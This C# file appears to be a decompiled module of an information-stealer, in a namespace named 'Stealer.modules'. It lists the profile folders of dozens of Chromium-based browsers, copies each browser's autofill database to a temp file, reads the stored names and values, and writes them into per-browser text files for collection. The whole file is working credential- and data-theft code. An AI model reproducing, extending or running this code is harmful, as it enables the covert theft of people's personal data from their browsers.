using System;
using System.Collections.Generic;
using System.IO;

namespace Stealer.modules
{
	// Token: 0x02000002 RID: 2
	internal class Autofill
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public static void GetCAutofills()
		{
			string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
			string str2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
			string str3 = "\\User Data\\Default\\Web data";
			string[] array = new string[]
			{
				str2 + "Google\\Chrome" + str3,
				str2 + "Google(x86)\\Chrome" + str3,
				str2 + "Chromium" + str3,
				str2 + "Microsoft\\Edge" + str3,
				str + "Opera Software\\Opera Stable\\History",
				str2 + "BraveSoftware\\Brave-Browser" + str3,
				str2 + "Epic Privacy Browser" + str3,
				str2 + "Amigo" + str3,
				str2 + "AcWebBrowser" + str3,
				str2 + "Flock" + str3,
				str2 + "Black Hawk" + str3,
				str2 + "Maple Studio" + str3,
				str2 + "CoolNovo" + str3,
				str2 + "Titan Browser" + str3,
				str2 + "Baidu Spark" + str3,
				str2 + "Vivaldi" + str3,
				str2 + "Orbitum" + str3,
				str2 + "Rockmelt" + str3,
				str2 + "Mail.Ru\\Atom" + str3,
				str2 + "CentBrowser" + str3,
				str2 + "Kometa" + str3,
				str2 + "Comodo\\Dragon" + str3,
				str2 + "Torch" + str3,
				str2 + "Comodo" + str3,
				str2 + "Slimjet" + str3,
				str2 + "360Browser\\Browser" + str3,
				str2 + "Maxthon" + str3,
				str2 + "K-Melon" + str3,
				str2 + "Sputnik\\Sputnik" + str3,
				str2 + "Nichrome" + str3,
				str2 + "CocCoc\\Browser" + str3,
				str2 + "uCozMedia\\Uran" + str3,
				str2 + "Chromodo" + str3,
				str2 + "Yandex\\YandexBrowser" + str3
			};
			List<string[]> list = new List<string[]>();
			try
			{
				foreach (string text in array)
				{
					if (File.Exists(text))
					{
						string text2 = "";
						foreach (string text3 in Help.BrowsersName)
						{
							if (text.Contains(text3))
							{
								text2 = text3;
							}
						}
						string text4 = Environment.GetEnvironmentVariable("temp") + "\\browserCreditCards";
						if (File.Exists(text4))
						{
							File.Delete(text4);
						}
						File.Copy(text, text4);
						cSQLite cSQLite = new cSQLite(text4);
						cSQLite.ReadTable("autofill");
						for (int k = 0; k < cSQLite.GetRowCount(); k++)
						{
							string value = cSQLite.GetValue(k, 0);
							string value2 = cSQLite.GetValue(k, 1);
							if (string.IsNullOrEmpty(value))
							{
								break;
							}
							string[] item = new string[]
							{
								Crypt.toUTF8(value),
								Crypt.toUTF8(value2),
								text2
							};
							list.Add(item);
						}
					}
				}
			}
			catch
			{
			}
			string str4 = Program.path + "\\";
			foreach (string[] array3 in list)
			{
				Directory.CreateDirectory(str4 + array3[2]);
				using (StreamWriter streamWriter = new StreamWriter(str4 + array3[2] + "\\Autofill.txt", true))
				{
					streamWriter.WriteLine("\n[AUTOFILL]\nName: " + array3[0] + "\nValue: " + array3[1]);
				}
			}
		}
	}
}
